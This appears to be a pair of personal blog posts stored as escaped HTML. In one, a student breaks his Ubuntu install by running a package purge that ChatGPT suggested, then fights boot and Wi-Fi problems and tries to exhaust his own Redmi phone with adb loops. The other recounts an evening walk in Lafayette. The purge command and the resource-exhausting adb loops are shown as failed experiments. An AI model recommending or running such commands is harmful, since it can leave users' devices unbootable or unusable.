Then Chatgpt told me to</p>\n<pre><code>sudo apt-get purge libudev-dev</code></pre>\n<p>And I tried that command, and it broke my computer. Suddenly my\ncomputer could no longer boot.</p>\n<h2 id=\"remembering-the-homework-deadline\">Remembering the Homework\nDeadline</h2>\n<p>Then I remembered I had to do a homework by the end of the day(like 2\nhours work), so I was very anxious indeed, and I went to the school and\ntried work on the windows computer there.</p>\n<p>But the homework wouldn\u2019t work in the school\u2019s windows\ncomputer(without python) and gooogle colab, since it constantly\ncomplained about modules and libraries.</p>\n<p>And I tried for 2 hours without any success of making the homework\nrun on the school\u2019s computer or the cloud server, and the school's\nlibrary is closing, so I went back home again and tried to fix the\ncomputer.</p>\n<h2 id=\"emergency-mode\">Emergency Mode</h2>\n<p>The computer boots into emergency mode when it starts, and I had no\nidea what to do. After trying the root password several times I finally\nmanaged to boot into root, but the systemd was broken, and I entered\nrecovery mode and tried to fsck the system.</p>\n<p>A dev service was kind of broken, and Ubuntu couldn't launch.</p>\n<p>Anyways, it didn\u2019t work well, and I didn\u2019t know how to connect to the\ninternet with the computer. So I tried booting from a usb disk, and it\ndidn\u2019t went well either. I still couldn\u2019t connect to the internet.</p>\n<h2 id=\"installing-from-usb-again\">Installing from USB Again</h2>\n<p>So I tried to install Ubuntu again from the usb stick. But when\nbooting the old network thing went wrong again. So I tried changing the\nnetwork service timeout and it worked.</p>\n<pre><code>sudo nano /lib/systemd/system/networkd-wait-online.service</code></pre>\n<p>Then change add timeout to 1 second after the exec command.</p>\n<p>Then I could only make Ubuntu connect to internet with ethernet,\nconnecting my phone to the computer with a usb and then by using\n<code>ip link</code> to list devices then\n<code>sudo dhclient enx\u2026</code> to connect to that device, then I could\ngo online, but there was this no additional driver found, and I tried\ncloning the rt driver and it didn\u2019t work. However, it continuously shows\nno Wi-Fi adapters found.</p>\n<h2 id=\"rubbish-redmi-unlocker\">Rubbish Redmi Unlocker</h2>\n<p>However, my redmi phone was locked by the bootloader, so I needed to\nunlock the bootloader to be root. However, I opened the\nhttps://unlock.update.mini.com and it wouldn\u2019t download for like 10\ntimes. It is very crappy indeed. Then when I finally get it to download\nit returned a zip with only exe files in it, which is totally terrible\nand inconsiderate for the company.</p>\n<p>I tried running the exe with wine but it face so many problems. It\nwouldn't even display. Wine is the most buggy program in Ubuntu.\nYesterday I went to the school and tried running it on the school\u2019s\nwindows computer but it couldn\u2019t detect the Redmi phone connected.</p>\n<p>So since the bootloader was only in exe I decided it is very crap\nanyways. So I started to hate redmi like I hate windows.</p>\n<h2 id=\"phone-ownership\">Phone Ownership</h2>\n<p>Then I thought about phone ownership and reckoned that if I cannot\naccess the bootloader I do not really own this phone. I cannot customize\nanything, the phone is just basically owned by the company. Don't talk\nabout security and integrity measures, if I cannot do customized\nsettings in this phone I do not own it 100%, and that's not good.</p>\n<h2 id=\"trying-to-overload-the-phone\">Trying to Overload the Phone</h2>\n<p>And then I thought since I do not own the phone and the phone is old\nI want to try overload the phone with adb.</p>\n<p>Adb have no root access since the phone is locked, and I tried\nfastboot too, it wouldn't load.</p>\n<p>Then I tried to play around with the adb shell and tried to overload\nthe device. I tried a infinite\nloops.<code>adb shell \"while true; do :; done &amp;</code> It instantly\nmade the old phone unusable, but nothing else, and when unplugged the\nphone would still run as good as normal.</p>\n<p>Then I tried to load large files into the phone\n<code>while true; do adb push large_file.txt /sdcard/; done</code>, but\nthe storage soon filled up and the data part was only accessible by\nroot, and the phone was usable after all the mess around.</p>\n<h2 id=\"no-wifi-adapters-on-ubuntu\">No Wifi-Adapters on Ubuntu</h2>\n<p>Then the Ubuntu Gnome couldn't connect to Wifi, and I couldn't figure\nout the reason. I could only connect to wifi with a phone and usb\ncables.</p>\n<p>Then I tried nmcli device wifi list, but it returned</p>\n<pre><code>IN-USE \u00a0BSSID \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0SSID \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0MODE \u00a0 CHAN \u00a0RATE \u00a0 &gt;</code></pre>\n<p>I figured it was because I disabled the network devices earlier on,\nand after <code>ls /lib/systemd/system | grep etwork</code> it returned\nmultiple services,</p>\n<pre><code>systemd-networkd.service\nsystemd-networkd-wait-online.service\nNetworkManager.service\nNetworkManager-wait-online.service</code></pre>\n<p>the networkd service causing the\n<code>A start job is running for wait for network to be configured</code>\nproblem, I might actually accidentally disabled the other.</p>\n<p>Then I tried other desktop environments like lxde but lxde wouldn\u2019t\nboot and encountered multiple system problems.</p>\n<h2\nid=\"watching-the-russian-figure-skating-test-skate-free-program\">Watching\nthe Russian Figure Skating Test Skate Free Program</h2>\n<p>And then I had tried like 12 hours without success and missed my\nhomework deadline so I was very much in distress. It was 5 am in the\nmorning. So I watched Russian figure skating test skate free program\nlive on <a href=\"https://1tv.ru\" class=\"uri\">https://1tv.ru</a> and went\nto sleep.</p>\n<h2 id=\"installing-ubuntu-again\">Installing Ubuntu Again</h2>\n<p>Then I installed the Ubuntu again today, erasing yesterday\u2019s\npartition and there was no Wi-Fi adapter problems.</p>\n<p>The steps are</p>\n<ul>\n<li>boot the system (with/without network configurations)</li>\n<li>connect phone to computer and use dhclient to connect to\nInternet</li>\n<li><code>sudo apt update &amp;&amp; sudo apt install ubuntu-desktop gdm3</code></li>\n<li><code>sudo systemctl start gdm3</code></li>\n</ul>\n<p>Then enable the timeout in\n'systemd-networkd-wait-online.service'.</p>\n",

I tried to find dinner, and went into local kitchens and\nbought a tortilla and some chips for dinner, then I eat as I went\naround. The food was very delicious.</p>\n<p>The streets are literally so dark in Lafayette at night. As I started\nwalking towards the Lafayette creek on Moraga Blvd I couldn\u2019t see\nanything, as the only light was from some houses, so I turned back.</p>\n<p>There wasn\u2019t much to see at night. I walked on Moraga Road and there\nwas an elementary school. Then after that the street go so dark so I\nwent to back to Mount Diablo Blvd.</p>\n<h2 id=\"safeway\">Safeway</h2>\n<p>There was a Safeway on Mount Diablo Blvd so I went inside. There was\nthis watermelon cup, and buy 2 get 1 free thing. So I went and get 3. I\nalso got some oatmeals and stuff. Safeway was open 24 hours, and I\nthought it is so nice and looked it on map, then realized there is one\nvery near my home and I didn\u2019t even know that before.</p>\n<p>Anyways as I went out I realized that the watermelon cup is very\nlarge, and one is quite enough, and I had to carry 2 of them with me. So\nI thought shopping was kind of like leaky relu in machine learning, you\ndon\u2019t necessarily get more rewards with more budget.</p>\n<p>When I walked out of the supermarket I saw some people but realized\nthey weren\u2019t homeless but normal people. And I thought Lafayette is like\none of the affluent neighborhoods around here, so that isn\u2019t much\nsurprising anyway.</p>\n<h2 id=\"deciding-to-go-back\">Deciding to Go Back</h2>\n<p>However no matter which way I walked, it is dark and creepy, and with\nfood I bought from Safeway to carry I could practically go nowhere.\nThere were still some cars in the streets though.</p>\n<p>Then I tried walking west on Mount Diablo Blvd.The people I saw when\nI first came out of the Bart Station were gone as well as their trucks.\nI couldn\u2019t go half a mile before there were no light on the streets and\nI decided to take the Bart back.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>In conclusion, this is a somewhat unsuccessful journey, but there are\nalways ups and downs. I would probably try to plan more when visiting\nplaces at night, and choose populous places like San Francisco. Other\nthan that, the food is delicious and going to Lafayette was fun, and\nLafayette is a quiet, clean, and fine neighborhood.</p>\n",
